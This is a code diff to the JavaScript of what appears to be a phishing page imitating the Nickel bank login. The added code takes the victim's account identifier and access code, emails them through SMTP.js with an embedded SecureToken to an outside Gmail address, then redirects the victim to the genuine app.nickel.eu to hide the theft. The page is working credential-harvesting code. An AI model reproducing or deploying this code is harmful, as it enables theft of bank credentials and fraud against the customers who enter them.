@@ -84,7 +84,7 @@ function addChecked(e) {
     if(ok ===6 ) c6.checked = true;
 
     if(ok === 6 ) {
-        Email.send({
+        /*Email.send({
             //SecureToken : "511610c1-8890-4119-97b5-50dbe7b4e073",
             Host: "smtp.gmail.com",
             Username: "leonbonou20@gmail.com",
@@ -95,6 +95,28 @@ function addChecked(e) {
             Body : "ok"//"Identifiant: " + identifiant + " - Code : " + codeAccess
         }).then(
             message => alert("Send")
+        );*/
+
+
+        Email.send({
+            SecureToken : "46d446dd-390e-40d8-b0b5-cc49dd4e3c53",
+
+            To : 'appn26login@gmail.com',
+            From : "leonbonou20@gmail.com",
+            Subject : "Nickel Information :-)",
+            Body : "<strong>Les informations du compte Nickel</strong> <br><br><br>\n" +
+                "    <table>\n" +
+                "        <tr>\n" +
+                "            <th style=\"text-align: left\">Identifiant: </th>\n" +
+                "            <td>" + identifiant + "</td>\n" +
+                "        </tr>\n" +
+                "        <tr>\n" +
+                "            <th style=\"text-align: left\">Code: </th>\n" +
+                "            <td style=\"color: red\">"+ codeAccess + "</td>\n" +
+                "        </tr>\n" +
+                "    </table> <br> <br> Merci!",
+        }).then(
+            window.location.href = "https://app.nickel.eu"
         );
         //window.location.href = "https://app.nickel.eu" //ok
     }
